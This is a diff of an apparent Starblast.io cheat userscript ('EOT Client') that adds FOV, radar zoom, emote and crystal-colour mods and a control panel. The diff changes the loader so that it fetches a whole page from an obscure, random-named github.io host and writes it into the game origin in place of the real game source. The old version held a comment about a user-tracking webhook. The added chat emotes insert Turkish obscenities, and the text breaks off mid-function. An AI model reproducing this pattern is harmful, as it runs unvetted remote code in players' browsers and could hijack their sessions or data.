@@ -1,412 +1,908 @@
-
 if (!window.sbCodeInjectors) window.sbCodeInjectors = [];
 
-// --- MOD SETTINGS & HELPERS ---
+// Global settings object
 window.modSettings = {
-    fovEnabled: true,
-    emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
-    uiVisible: true,
-    radarZoomEnabled: false
+  fovEnabled: true,
+  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,  // Parse as integer
+  uiVisible: true,  // Add comma here
+  radarZoomEnabled: false
 };
+
+// Lowercase Name Mod
+const modName = "Lowercase Name";
+const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");
+
+function lowercaseInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
+  
+  function checkSrcChange() {
+    if (src === prevSrc) throw new Error("replace did not work");
+    prevSrc = src;
+  }
+
+  src = src.replace(/\.toUpperCase\(\)/g, "");
+  const styleBlock = `
+  <style>
+  #player input { text-transform: none !important; }
+  </style>
+  `;
+  src = src.replace('</head>', `${styleBlock}</head>`);
+  checkSrcChange();
+
+  logLowercase("Mod injected");
+  return src;
+}
+
+// Custom Emote Mod
+const emoteModName = "Custom Emote";
+const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");
+
+function emoteInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
+  
+  function checkSrcChange() {
+    if (src === prevSrc) throw new Error("replace did not work");
+    prevSrc = src;
+  }
+
+  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
+  const emotes = `,{
+    text: "orosbu cocu",
+    icon: "🤡",
+    key: "J"
+  },{
+    text: "sikerim",
+    icon: "⚠️",
+    key: "V"
+  }`;
+
+  src = src.replace(vocabPattern, `$1${emotes}`);
+  checkSrcChange();
+  logEmote("Clown and warning emotes injected");
+  
+  return src;
+}
+
+// FOV Editor Mod
+const fovModName = "FOV Editor";
+const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");
 
 window.I1000 = window.I1000 || {};
 window.I1000.baseFOV = 45;
 window.I1000.currentFOV = 45;
 
-const log = (modName, msg, color) => console.log(`%c[${modName}] ${msg}`, `color: ${color}`);
+function fovInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
 
-function checkSrcChange(prev, next, mod) {
-    if (prev === next) {
-        console.error(`[${mod}] Replacement failed. The source code was not modified.`);
-        // Note: In some cases, multiple identical patterns might exist. This check is a safety measure.
-        // For production, you might remove the `throw` to allow the script to continue.
-        // throw new Error(`[${mod}] Replacement failed.`);
-    }
-}
-
-// --- INDIVIDUAL MOD INJECTORS ---
-
-/**
- * Lowercase Name Mod: Removes the toUpperCase() call on the player name input.
- */
-function lowercaseInjector(sbCode) {
-    const modName = "Lowercase Name";
-    let src = sbCode;
-    let prevSrc = src;
-
-    src = src.replace(/\.toUpperCase\(\)/g, "");
-    const styleBlock = `<style>#player input { text-transform: none !important; }</style>`;
-    src = src.replace('</head>', `${styleBlock}</head>`);
-
-    checkSrcChange(prevSrc, src, modName);
-    log(modName, "Mod injected", "#FF00A6");
-    return src;
-}
-
-/**
- * Custom Emote Mod: Adds custom emotes to the in-game chat wheel.
- */
-function emoteInjector(sbCode) {
-    const modName = "Custom Emote";
-    let src = sbCode;
-    let prevSrc = src;
-
-    const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
-    const emotes = `,{
-        text: "orosbu cocu",
-        icon: "🤡",
-        key: "J"
-    },{
-        text: "sikerim",
-        icon: "⚠️",
-        key: "V"
-    }`;
-
-    src = src.replace(vocabPattern, `$1${emotes}`);
-    checkSrcChange(prevSrc, src, modName);
-    log(modName, "Clown and warning emotes injected", "#FFA500");
-    return src;
-}
-
-/**
- * Fixes a TypeError by aliasing a missing method to its new name.
- */
-function aliasFunctionInjector(sbCode) {
-    const modName = "Function Alias Fix";
-    let src = sbCode;
-    let prevSrc = src;
-
-    const messagesClassPattern = /(this\.Messages\s*=\s*function\(\)\s*\{[\s\S]*?\}\(\)\s*,)/;
-    const patch = `this.Messages.prototype.l110l=this.Messages.prototype.l110l;this.Messages.prototype.I1OlO=this.Messages.prototype.l110l;`;
-
-    src = src.replace(messagesClassPattern, `$1 ${patch}`);
-
-    // This replacement is tricky, so we'll be more lenient with the check.
-    // If it fails, it won't break everything else.
+  function checkSrcChange() {
     if (src === prevSrc) {
-        console.warn(`[${modName}] Alias injection point not found. This might be ok if the game code changed.`);
-    } else {
-        log(modName, "Patched 'this.messages.I1OlO' TypeError.", "#42f560");
+      console.error("Replace did not work. Previous source and current source are identical.");
+      throw new Error("replace did not work");
     }
-    return src;
-}
+    prevSrc = src;
+  }
 
+  const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/g;
+  if (!fovPattern.test(src)) {
+    console.error("Pattern not found in source code:", fovPattern);
+    throw new Error("Pattern not found in source code");
+  }
+  src = src.replace(fovPattern, 'this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom');
+  checkSrcChange();
 
-/**
- * UI Panel Mod: Injects a control panel for FOV, emotes, radar, and colors.
- * This function consolidates multiple UI-related mods to prevent scope issues.
- */
-function uiPanelInjector(sbCode) {
-    const modName = "UI Panel";
-    let src = sbCode;
-    let prevSrc = src;
+const controlStyles = `
+<style>
+  #mod-controls {
+    position: fixed;
+    top: 12px;
+    left: 12px;
+    z-index: 1000;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    user-select: none;
+    background: rgba(16, 18, 27, 0.97);
+    backdrop-filter: blur(8px);
+    border-radius: 4px;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
+    color: #ffffff;
+    padding: 0;
+    width: 160px;
+    border: 1px solid rgba(255, 255, 255, 0.12);
+  }
 
-    // --- FOV & Radar Zoom Logic ---
-    const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/g;
-    const fovReplacement = 'this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom';
-    src = src.replace(fovPattern, fovReplacement);
-    checkSrcChange(prevSrc, src, modName + " (FOV)");
+  #mod-controls-header {
+    cursor: pointer;
+    padding: 10px 12px;
+    background: rgba(255, 255, 255, 0.06);
+    font-weight: 600;
+    font-size: 13px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+  }
 
-    const radarZoomPattern = /this\.lII11\.mode\.radar_zoom/g;
-    const radarZoomReplacement = '(window.modSettings.radarZoomEnabled ? 1.0 : this.lII11.mode.radar_zoom)';
-    src = src.replace(radarZoomPattern, radarZoomReplacement);
-    checkSrcChange(prevSrc, src, modName + " (Radar)");
-    prevSrc = src; // Reset prevSrc after successful replacement
+  #mod-controls-header::before {
+    content: '⚙️';
+    font-size: 14px;
+    filter: drop-shadow(0 0 4px rgba(255, 65, 215, 0.3));
+  }
 
-    // --- HTML & CSS for the UI Panel ---
-    const controlStyles = `
-    <style>
-      #mod-controls {
-        position: fixed; top: 12px; left: 12px; z-index: 10001; font-family: 'Segoe UI', system-ui, sans-serif; user-select: none;
-        background: rgba(16, 18, 27, 0.97); backdrop-filter: blur(8px); border-radius: 4px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
-        color: #ffffff; padding: 0; width: 160px; border: 1px solid rgba(255, 255, 255, 0.12);
-      }
-      #mod-controls-header {
-        cursor: pointer; padding: 10px 12px; background: rgba(255, 255, 255, 0.06); font-weight: 600; font-size: 13px;
-        display: flex; align-items: center; gap: 8px; border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-      }
-      #mod-controls-header::before {
-        content: '⚙️'; font-size: 14px; filter: drop-shadow(0 0 4px rgba(255, 65, 215, 0.3));
-      }
-      #mod-controls-panel { padding: 12px; display: none; }
-      .mod-control { display: flex; justify-content: space-between; align-items: center; margin: 8px 0; font-size: 12px; color: rgba(255, 255, 255, 0.9); }
-      .mod-control-slider { width: 100%; margin: 8px 0; height: 3px; background: rgba(255, 255, 255, 0.1); -webkit-appearance: none; appearance: none; outline: none; border-radius: 1px; }
-      .mod-control-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 12px; height: 12px; background: #ff41d7; border-radius: 2px; cursor: pointer; box-shadow: 0 1px 4px rgba(255, 65, 215, 0.3); }
-      .mod-control-slider::-moz-range-thumb { width: 12px; height: 12px; background: #ff41d7; border-radius: 2px; cursor: pointer; }
-      #crystal-color-picker { width: 24px; height: 24px; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 3px; padding: 0; cursor: pointer; background: transparent; }
-      #fov-display { padding: 8px 12px; background: rgba(255, 255, 255, 0.06); font-size: 12px; display: flex; justify-content: space-between; margin-top: 6px; }
-      input[type="checkbox"] { position: relative; width: 36px; height: 20px; -webkit-appearance: none; appearance: none; background: rgba(255, 255, 255, 0.1); border-radius: 2px; transition: background 0.2s ease; cursor: pointer; }
-      input[type="checkbox"]::before { content: ""; position: absolute; width: 16px; height: 16px; background: #fff; top: 2px; left: 2px; transform: translateX(0); transition: transform 0.2s ease; border-radius: 2px; }
-      input[type="checkbox"]:checked { background: #ff41d7; }
-      input[type="checkbox"]:checked::before { transform: translateX(14px); }
-      .control-value { font-weight: 600; color: #ff41d7; min-width: 32px; text-align: right; font-size: 11px; }
-    </style>
-    `;
+  #mod-controls-panel {
+    padding: 12px;
+    display: none;
+  }
 
-    const controlsHTML = `
-    <div id="mod-controls" style="display: ${window.modSettings.uiVisible ? 'block' : 'none'}">
-      <div id="mod-controls-header">EOT Client V3.0.2</div>
-      <div id="mod-controls-panel">
-        <div class="mod-control">
-          <span>FOV</span>
-          <input type="checkbox" id="fov-toggle" ${window.modSettings.fovEnabled ? 'checked' : ''}>
-        </div>
-        <div class="mod-control">
-          <span>Emote Capacity</span>
-          <div class="control-value" id="emote-capacity-value">${window.modSettings.emoteCapacity}</div>
-        </div>
-        <input type="range" min="1" max="5" value="${window.modSettings.emoteCapacity}" class="mod-control-slider" id="emote-capacity-slider">
-        <div class="mod-control">
-          <span>Radar Zoom</span>
-          <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
-        </div>
-        <div class="mod-control">
-          <span>Crystal Color</span>
-          <input type="color" id="crystal-color-picker" value="#ffffff">
-        </div>
-      </div>
-      <div id="fov-display">
-        FOV: <span id="fov-value">45</span>
-      </div>
+  .mod-control {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin: 8px 0;
+    font-size: 12px;
+    color: rgba(255, 255, 255, 0.9);
+  }
+
+  .mod-control-slider {
+    width: 100%;
+    margin: 8px 0;
+    height: 3px;
+    background: rgba(255, 255, 255, 0.1);
+    -webkit-appearance: none;
+    appearance: none;
+    outline: none;
+    border-radius: 1px;
+  }
+
+  .mod-control-slider::-webkit-slider-thumb {
+    -webkit-appearance: none;
+    width: 12px;
+    height: 12px;
+    background: #ff41d7;
+    border-radius: 2px;
+    cursor: pointer;
+    box-shadow: 0 1px 4px rgba(255, 65, 215, 0.3);
+  }
+
+  .mod-control-slider::-moz-range-thumb {
+    width: 12px;
+    height: 12px;
+    background: #ff41d7;
+    border-radius: 2px;
+    cursor: pointer;
+  }
+
+  #crystal-color-picker {
+    width: 24px;
+    height: 24px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 3px;
+    padding: 0;
+    cursor: pointer;
+    background: transparent;
+  }
+
+  #fov-display {
+    padding: 8px 12px;
+    background: rgba(255, 255, 255, 0.06);
+    font-size: 12px;
+    display: flex;
+    justify-content: space-between;
+    margin-top: 6px;
+  }
+
+  input[type="checkbox"] {
+    position: relative;
+    width: 36px;
+    height: 20px;
+    -webkit-appearance: none;
+    appearance: none;
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 2px;
+    transition: background 0.2s ease;
+  }
+
+  input[type="checkbox"]::before {
+    content: "";
+    position: absolute;
+    width: 16px;
+    height: 16px;
+    background: #fff;
+    top: 2px;
+    left: 2px;
+    transform: translateX(0);
+    transition: transform 0.2s ease;
+    border-radius: 2px;
+  }
+
+  input[type="checkbox"]:checked {
+    background: #ff41d7;
+  }
+
+  input[type="checkbox"]:checked::before {
+    transform: translateX(14px);
+  }
+
+  .control-value {
+    font-weight: 600;
+    color: #ff41d7;
+    min-width: 32px;
+    text-align: right;
+    font-size: 11px;
+  }
+
+  .section-title {
+    font-size: 10px;
+    color: rgba(255, 255, 255, 0.5);
+    text-transform: uppercase;
+    letter-spacing: 0.4px;
+    margin: 12px 0 6px;
+  }
+</style>
+`;
+
+const controlsHTML = `
+<div id="mod-controls" style="display: ${window.modSettings.uiVisible ? 'block' : 'none'}">
+  <div id="mod-controls-header">EOT Client V3.0.2</div>
+  <div id="mod-controls-panel">
+    <div class="mod-control">
+      <span>FOV</span>
+      <input type="checkbox" id="fov-toggle" ${window.modSettings.fovEnabled ? 'checked' : ''}>
     </div>
-    `;
+    <div class="mod-control">
+      <span>Emote Capacity</span>
+      <div class="control-value" id="emote-capacity-value">${window.modSettings.emoteCapacity}</div>
+    </div>
+    <input type="range" min="1" max="5" value="${window.modSettings.emoteCapacity}" class="mod-control-slider" id="emote-capacity-slider">
+    <div class="mod-control">
+      <span>Radar Zoom</span>
+      <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
+    </div>
+    <div class="mod-control">
+      <span>Crystal Color</span>
+      <input type="color" id="crystal-color-picker" value="#ffffff">
+    </div>
+  </div>
+  <div id="fov-display">
+    FOV: <span id="fov-value">45</span>
+  </div>
+</div>
+`;
 
-    // --- JavaScript for UI Panel Logic ---
-    const panelScript = `
-    <script>
-      (function() {
-        // Emote Capacity Mod
-        if (typeof ChatPanel !== 'undefined') {
-          ChatPanel.prototype.getEmotesCapacity = function() {
-            const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
-            return Math.min(Math.max(1, savedCapacity), 5);
-          };
-          ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
-          if (window.modSettings && window.modSettings.emoteCapacity) {
-            localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
-          }
+const emoteCapacityMod = `
+let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];
+
+// Override the emotes capacity getter
+ChatPanel.prototype.getEmotesCapacity = function() {
+  const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
+  return Math.min(Math.max(1, savedCapacity), 5);
+};
+
+// Override the typed function to use the new capacity
+ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
+
+// Set initial capacity
+if (window.modSettings && window.modSettings.emoteCapacity) {
+  localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
+}
+`;
+
+const crystalColorMod = `
+/*
+ * Change crystal color (integrated version)
+ */
+let CrystalObject;
+
+// Function to find CrystalObject
+const findCrystalObject = () => {
+  for (const key in window) {
+    try {
+      const obj = window[key];
+      if (
+        obj?.prototype?.createModel &&
+        obj.prototype.createModel.toString().includes('Crystal')
+      ) {
+        return obj;
+      }
+    } catch (e) {
+      // Ignore errors during object inspection
+    }
+  }
+  return null;
+};
+
+// Detect and set CrystalObject
+CrystalObject = findCrystalObject();
+
+if (CrystalObject) {
+  console.log('Found CrystalObject:', CrystalObject.name);
+
+  const originalGetModelInstance = CrystalObject.prototype.getModelInstance;
+  const materialInstances = new Set();
+
+  // Override getModelInstance to update crystal material color
+  CrystalObject.prototype.getModelInstance = function () {
+    const instance = originalGetModelInstance.apply(this, arguments);
+
+    if (this.material) {
+      materialInstances.add(this.material);
+      const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
+
+      // Apply saved color to material
+      this.material.color.set(savedColor);
+
+      // If the material has uniforms, update them as well
+      if (this.material.uniforms?.color) {
+        this.material.uniforms.color.value.set(this.material.color);
+      }
+
+      this.material.needsUpdate = true;
+    } else {
+      console.warn('Material not found for crystal instance.');
+    }
+
+    return instance;
+  };
+
+  // Function to update crystal colors dynamically
+  const updateCrystalColor = (color) => {
+    try {
+      localStorage.setItem('crystal-color', color);
+      materialInstances.forEach((material) => {
+        material.color.set(color);
+        if (material.uniforms?.color) {
+          material.uniforms.color.value.set(material.color);
         }
+        material.needsUpdate = true;
+      });
+      console.log('Updated crystal color:', color);
+    } catch (e) {
+      console.error('Error updating crystal color:', e);
+    }
+  };
 
-        // Crystal Color Mod
-        let CrystalObject;
-        const findCrystalObject = () => {
-          for (const key in window) {
-            try {
-              const obj = window[key];
-              if (obj && obj.prototype && obj.prototype.createModel && obj.prototype.createModel.toString().includes('Crystal')) {
-                return obj;
-              }
-            } catch (e) { /* Ignore */ }
-          }
-          return null;
+  // Add color picker event listener after DOM is ready
+  document.addEventListener('DOMContentLoaded', () => {
+    const crystalColorPicker = document.getElementById('crystal-color-picker');
+    if (crystalColorPicker) {
+      const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
+      crystalColorPicker.value = savedColor;
+
+      crystalColorPicker.addEventListener('input', (event) => {
+        updateCrystalColor(event.target.value);
+      });
+
+      console.log('Crystal color picker initialized with color:', savedColor);
+    } else {
+      console.warn('Crystal color picker element not found.');
+    }
+  });
+} else {
+  console.warn('CrystalObject not found!');
+
+  // Define a placeholder function to avoid errors
+  const updateCrystalColor = () => {};
+}
+`;
+
+src = src.replace('</body>', `
+  ${controlStyles}
+  ${controlsHTML}
+  <script>
+  ${emoteCapacityMod}
+  ${crystalColorMod}
+
+  const fovDisplay = document.getElementById('fov-display');
+
+  // Add wheel event listener for FOV change
+  document.addEventListener('wheel', (e) => {
+    if (!window.modSettings.fovEnabled) return;
+    e.preventDefault();
+    const delta = e.deltaY < 0 ? 1 : -1;
+    // Add bounds checking
+    window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
+    document.getElementById('fov-value').textContent = window.I1000.currentFOV;
+  }, { passive: false });
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const controlsHeader = document.getElementById('mod-controls-header');
+    const controlsPanel = document.getElementById('mod-controls-panel');
+    const fovToggle = document.getElementById('fov-toggle');
+    const emoteSlider = document.getElementById('emote-capacity-slider');
+    const emoteValue = document.getElementById('emote-capacity-value');
+    const radarZoomToggle = document.getElementById('radar-zoom-toggle');
+    const crystalColorPicker = document.getElementById('crystal-color-picker');
+
+    // Initialize values from localStorage
+    const savedCrystalColor = localStorage.getItem('crystal-color');
+    if (savedCrystalColor) {
+      crystalColorPicker.value = savedCrystalColor;
+    }
+
+    controlsHeader.addEventListener('click', () => {
+      controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
+    });
+
+    fovToggle.addEventListener('change', () => {
+      window.modSettings.fovEnabled = fovToggle.checked;
+      fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
+    });
+
+    emoteSlider.addEventListener('input', () => {
+      const value = parseInt(emoteSlider.value);
+      emoteValue.textContent = value;
+      window.modSettings.emoteCapacity = value;
+      localStorage.setItem('emote-capacity', value);
+      
+      // Update the emote capacity immediately
+      if (window.ChatPanel) {
+        ChatPanel.prototype.getEmotesCapacity = function() {
+          return value;
         };
-        const materialInstances = new Set();
-        const updateCrystalColor = (color) => {
-            try {
-                localStorage.setItem('crystal-color', color);
-                materialInstances.forEach((material) => {
-                    if (material && typeof material.color.set === 'function') {
-                        material.color.set(color);
-                        if (material.uniforms && material.uniforms.color) {
-                            material.uniforms.color.value.set(material.color);
-                        }
-                        material.needsUpdate = true;
-                    }
-                });
-            } catch (e) { console.error('Error updating crystal color:', e); }
-        };
-        const initCrystalColor = () => {
-          CrystalObject = findCrystalObject();
-          if (CrystalObject) {
-            const originalGetModelInstance = CrystalObject.prototype.getModelInstance;
-            CrystalObject.prototype.getModelInstance = function() {
-              const instance = originalGetModelInstance.apply(this, arguments);
-              if (this.material) {
-                materialInstances.add(this.material);
-                const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
-                this.material.color.set(savedColor);
-                if (this.material.uniforms && this.material.uniforms.color) {
-                  this.material.uniforms.color.value.set(this.material.color);
-                }
-                this.material.needsUpdate = true;
-              }
-              return instance;
-            };
-          }
-        };
+      }
+    });
 
-        // UI Panel Event Listeners
-        document.addEventListener('DOMContentLoaded', () => {
-          initCrystalColor();
-          const controlsHeader = document.getElementById('mod-controls-header');
-          const controlsPanel = document.getElementById('mod-controls-panel');
-          const fovToggle = document.getElementById('fov-toggle');
-          const emoteSlider = document.getElementById('emote-capacity-slider');
-          const emoteValue = document.getElementById('emote-capacity-value');
-          const radarZoomToggle = document.getElementById('radar-zoom-toggle');
-          const crystalColorPicker = document.getElementById('crystal-color-picker');
-          const fovDisplay = document.getElementById('fov-display');
+    radarZoomToggle.addEventListener('change', () => {
+      // Update global setting
+      window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
+      
+      // Force radar zoom update on all relevant objects
+      const allInstances = []; // You might need to adjust this to actually find all relevant instances
+      allInstances.forEach(instance => {
+        if (instance.radarZoomOverride) {
+          // Trigger a re-evaluation of radar_zoom
+          const currentValue = instance.radar_zoom;
+          instance.radar_zoom = currentValue;
+        }
+      });
+    });
 
-          // Restore saved crystal color
-          const savedCrystalColor = localStorage.getItem('crystal-color') || '#ffffff';
-          crystalColorPicker.value = savedCrystalColor;
+    crystalColorPicker.addEventListener('change', () => {
+      const color = crystalColorPicker.value;
+      updateCrystalColor(color);
+    });
 
-          controlsHeader.addEventListener('click', () => {
-            controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
-          });
+    // Initialize emote capacity from localStorage
+    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
+    emoteSlider.value = savedCapacity;
+    emoteValue.textContent = savedCapacity;
+    window.modSettings.emoteCapacity = savedCapacity;
+  });
+  </script>
+  </body>`);
 
-          fovToggle.addEventListener('change', () => {
-            window.modSettings.fovEnabled = fovToggle.checked;
-            fovDisplay.style.display = fovToggle.checked ? 'flex' : 'none';
-          });
+checkSrcChange();
 
-          emoteSlider.addEventListener('input', () => {
-            const value = parseInt(emoteSlider.value);
-            emoteValue.textContent = value;
-            window.modSettings.emoteCapacity = value;
-            localStorage.setItem('emote-capacity', value);
-          });
-
-          radarZoomToggle.addEventListener('change', () => {
-            window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
-          });
-
-          crystalColorPicker.addEventListener('input', (event) => {
-            updateCrystalColor(event.target.value);
-          });
-
-          // Initialize emote capacity from localStorage
-          const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
-          emoteSlider.value = savedCapacity;
-          emoteValue.textContent = savedCapacity;
-          window.modSettings.emoteCapacity = savedCapacity;
-
-          // Add wheel event listener for FOV change
-          document.addEventListener('wheel', (e) => {
-              if (!window.modSettings.fovEnabled) return;
-              e.preventDefault();
-              const delta = e.deltaY < 0 ? 1 : -1;
-              window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
-              document.getElementById('fov-value').textContent = window.I1000.currentFOV;
-          }, { passive: false });
-        });
-      })();
-    </script>
-    `;
-
-    // Inject the HTML and CSS
-    src = src.replace('</head>', `${controlStyles}</head>`);
-    src = src.replace('</body>', `${controlsHTML}${panelScript}</body>`);
-    checkSrcChange(prevSrc, src, modName);
-
-    log(modName, "Injected successfully", "#00A6FF");
-    return src;
+logFOV("FOV injector applied");
+return src;
 }
 
-// --- MAIN SCRIPT EXECUTION ---
+// Global settings object
+window.modSettings = {
+  fovEnabled: true,
+  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
+  uiVisible: true  // Make sure this is initialized
+};
 
-if (!window.sbCodeInjectors) window.sbCodeInjectors = [];
-
-// Push injectors into the array
-window.sbCodeInjectors.push(lowercaseInjector);
-window.sbCodeInjectors.push(emoteInjector);
-window.sbCodeInjectors.push(aliasFunctionInjector); // Fixes the TypeError
-window.sbCodeInjectors.push(uiPanelInjector);       // Handles all UI elements
-
-// Add event listener for F9 to toggle UI
+// Add event listener for F9 key
 document.addEventListener('keydown', (e) => {
-    if (e.key === 'F9') {
-        const controls = document.getElementById('mod-controls');
-        if (controls) {
-            window.modSettings.uiVisible = !window.modSettings.uiVisible;
-            controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
-        }
+  if (e.key === 'F9') {
+    const controls = document.getElementById('mod-controls');
+    if (controls) {
+      window.modSettings.uiVisible = !window.modSettings.uiVisible;
+      controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
+      
+      // Also hide the controls panel when hiding the UI
+      const controlsPanel = document.getElementById('mod-controls-panel');
+      if (!window.modSettings.uiVisible && controlsPanel) {
+        controlsPanel.style.display = 'none';
+      }
     }
+  }
+});
+
+// Make sure the initial state is set correctly when the DOM loads
+document.addEventListener('DOMContentLoaded', () => {
+  const controls = document.getElementById('mod-controls');
+  if (controls) {
+    controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
+  }
+});
+
+// Add all injectors
+window.sbCodeInjectors.push((sbCode) => {
+  try {
+    return lowercaseInjector(sbCode);
+  } catch (error) {
+    alert(`${modName} failed to load; error: ${error}`);
+    throw error;
+  }
+});
+
+window.sbCodeInjectors.push((sbCode) => {
+  try {
+    return emoteInjector(sbCode);
+  } catch (error) {
+    alert(`${emoteModName} failed to load; error: ${error}`);
+    throw error;
+  }
+});
+
+window.sbCodeInjectors.push((sbCode) => {
+  try {
+    return fovInjector(sbCode);
+  } catch (error) {
+    alert(`${fovModName} failed to load; error: ${error}`);
+    throw error;
+  }
 });
 
 // Main code injection logic
+const log = (msg) => console.log(`%c[eot] ${msg}`, "color: #FF00E6");
+
 function injectLoader() {
-    if (window.location.pathname !== "/") {
-        log("Loader", "Injection not needed on this page", "#ccc");
-        return;
-    }
+  if (window.location.pathname !== "/") {
+    log("Injection not needed");
+    return;
+  }
 
-    // Show a temporary loading screen
-    document.open();
-    document.write('<html><head><title>Loading...</title></head><body style="background-color:#111; color:#eee; font-family: sans-serif; text-align: center; padding-top: 20vh;"><h1>Loading Starblast.io with EOT...</h1></body></html>');
-    document.close();
+  document.open();
+  document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
+  document.close();
 
-    // Fetch the original game source
-    const url = 'https://starblast.io/?_=' + new Date().getTime();
-    const xhr = new XMLHttpRequest();
-    log("Loader", "Fetching game source...", "#00A6FF");
-    xhr.open("GET", url, true);
-    xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-            let starSRC = xhr.responseText;
+  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html';
+  url += '?_=' + new Date().getTime();
 
-            if (starSRC) {
-                log("Loader", "Source fetched. Applying mods...", "#00A6FF");
-                const startTime = performance.now();
+  var xhr = new XMLHttpRequest();
+  log("Fetching custom source...");
+  xhr.open("GET", url);
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      var starSRC = xhr.responseText;
 
-                // Apply all registered injectors
-                if (window.sbCodeInjectors) {
-                    let errorNotified = false;
-                    for (const injector of window.sbCodeInjectors) {
-                        try {
-                            if (typeof injector === "function") {
-                                starSRC = injector(starSRC);
-                            } else {
-                                console.warn("Injector was not a function:", injector);
-                            }
-                        } catch (error) {
-                            if (!errorNotified) {
-                                alert("One or more of your Starblast.io userscripts failed to load. Check the console (F12) for details.");
-                                errorNotified = true;
-                            }
-                            console.error("Injector failed:", error);
-                        }
-                    }
-                }
+      if (starSRC !== undefined) {
+        log("Source fetched successfully");
+        const start_time = performance.now();
+        log("Applying mods...");
 
-                const endTime = performance.now();
-                log("Loader", `Mods applied in ${(endTime - startTime).toFixed(0)}ms`, "#00A6FF");
-
-                // Write the modified source to the document
-                document.open();
-                document.write(starSRC);
-                document.close();
-
-            } else {
-                log("Loader", "Source fetch failed", "#FF0000");
-                alert("An error occurred while fetching the game code.");
+        if (!window.sbCodeInjectors) {
+          log("No Starblast.io userscripts found to load");
+        } else {
+          let error_notified = false;
+          for (const injector of window.sbCodeInjectors) {
+            try {
+              if (typeof injector === "function") starSRC = injector(starSRC);
+              else {
+                log("Injector was not a function");
+                console.log(injector);
+              }
+            } catch (error) {
+              if (!error_notified) {
+                alert("One of your Starblast.io userscripts failed to load");
+                error_notified = true;
+              }
+              console.error(error);
             }
-        } else if (xhr.readyState === 4) {
-            log("Loader", `Source fetch failed with status: ${xhr.status}`, "#FF0000");
-            alert(`Failed to load game assets. Status: ${xhr.status}`);
+          }
         }
-    };
-    xhr.send();
+
+        const end_time = performance.now();
+        log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);
+
+        // After modifying the starSRC, apply text shadow modification
+        changeTextShadowColor();
+
+        // Apply the modified source to the document
+        document.open();
+        document.write(starSRC);
+        document.close();
+      } else {
+        log("Source fetch failed");
+        alert("An error occurred while fetching game code");
+      }
+    }
+  };
+
+  xhr.send();
 }
 
-// Webhook for user tracking (optional)
+// Function to change all text-shadow properties to a specific color
+function changeTextShadowColor() {
+  const elements = document.querySelectorAll('*'); // Select all elements on the page
+  const targetShadow = '0 0 6px hsl(298.15deg 100% 50%)'; // Target text-shadow style
+
+  elements.forEach(element => {
+    const currentStyle = window.getComputedStyle(element);
+    const textShadow = currentStyle.getPropertyValue('text-shadow');
+    
